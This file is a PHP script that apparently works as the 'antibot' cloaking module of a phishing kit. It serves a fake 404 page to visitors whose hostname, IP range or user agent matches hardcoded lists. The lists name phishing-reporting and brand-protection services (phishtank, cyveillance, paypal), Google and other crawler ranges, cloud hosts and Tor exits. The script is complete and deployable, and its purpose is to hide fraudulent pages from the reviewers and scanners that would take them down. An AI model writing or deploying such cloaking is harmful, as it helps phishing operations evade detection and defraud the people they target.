<?php

// === CONFIGURATION ===
$blockedHostKeywords = [
    "above", "google", "softlayer", "amazonaws", "cyveillance", "phishtank", 
    "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "paypal"
];

$blockedIPPatterns = [
    "^66\.102\.", "^38\.100\.", "^107\.170\.", "^149\.20\.", "^38\.105\.", "^74\.125\.",
    "^66\.150\.14\.", "^54\.176\.", "^184\.173\.", "^66\.249\.", "^128\.242\.",
    "^72\.14\.192\.", "^208\.65\.144\.", "^209\.85\.128\.", "^216\.239\.32\.",
    "^207\.126\.144\.", "^173\.194\.", "^64\.233\.160\.", "^64\.18\.", "^194\.52\.68\.",
    "^194\.72\.238\.", "^62\.116\.207\.", "^212\.50\.193\.", "^69\.65\.", "^50\.7\.",
    "^131\.212\.", "^46\.116\.", "^62\.90\.", "^89\.138\.", "^82\.166\.", "^85\.64\.",
    "^85\.250\.", "^93\.172\.", "^109\.186\.", "^194\.90\.", "^212\.29\.192\.",
    "^212\.29\.224\.", "^212\.143\.", "^212\.150\.", "^212\.235\.", "^217\.132\.",
    "^50\.97\.", "^209\.85\.", "^66\.205\.64\.", "^204\.14\.48\.", "^64\.27\.2\.",
    "^67\.15\.", "^202\.108\.252\.", "^193\.47\.80\.", "^64\.62\.136\.", "^66\.221\.",
    "^64\.62\.175\.", "^198\.54\.", "^192\.115\.134\.", "^216\.252\.167\.",
    "^193\.253\.199\.", "^69\.61\.12\.", "^64\.37\.103\.", "^38\.144\.36\.",
    "^64\.124\.14\.", "^206\.28\.72\.", "^209\.73\.228\.", "^158\.108\.", "^168\.188\.",
    "^66\.207\.120\.", "^167\.24\.", "^192\.118\.48\.", "^67\.209\.128\.",
    "^12\.148\.209\.", "^12\.148\.196\.", "^193\.220\.178\.", "^68\.65\.53\.71",
    "^198\.25\.", "^64\.106\.213\."
];

$blockedUserAgents = [
    'google', 'Googlebot', 'msnbot', 'Yahoo! Slurp', 'YahooSeeker', 'bingbot',
    'crawler', 'PycURL', 'facebookexternalhit'
];

// === FUNCTIONS ===

function isBlockedHostname(string $hostname, array $blockedWords): bool {
    foreach ($blockedWords as $word) {
        if (stripos($hostname, $word) !== false) {
            return true;
        }
    }
    return false;
}

function isBlockedIP(string $ip, array $patterns): bool {
    foreach ($patterns as $pattern) {
        if (preg_match("/$pattern/", $ip)) {
            return true;
        }
    }
    return false;
}

function isBlockedUserAgent(string $userAgent, array $blockedAgents): bool {
    foreach ($blockedAgents as $agent) {
        if (stripos($userAgent, $agent) !== false) {
            return true;
        }
    }
    return false;
}

function denyAccess(): void {
    header("HTTP/1.0 404 Not Found");
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}

// === MAIN EXECUTION ===

$remoteIP = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($remoteIP);
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Check hostname
if (isBlockedHostname($hostname, $blockedHostKeywords)) {
    denyAccess();
}

// Check IP
if (isBlockedIP($remoteIP, $blockedIPPatterns)) {
    denyAccess();
}

// Check User-Agent
if (isBlockedUserAgent($userAgent, $blockedUserAgents)) {
    denyAccess();
}
?>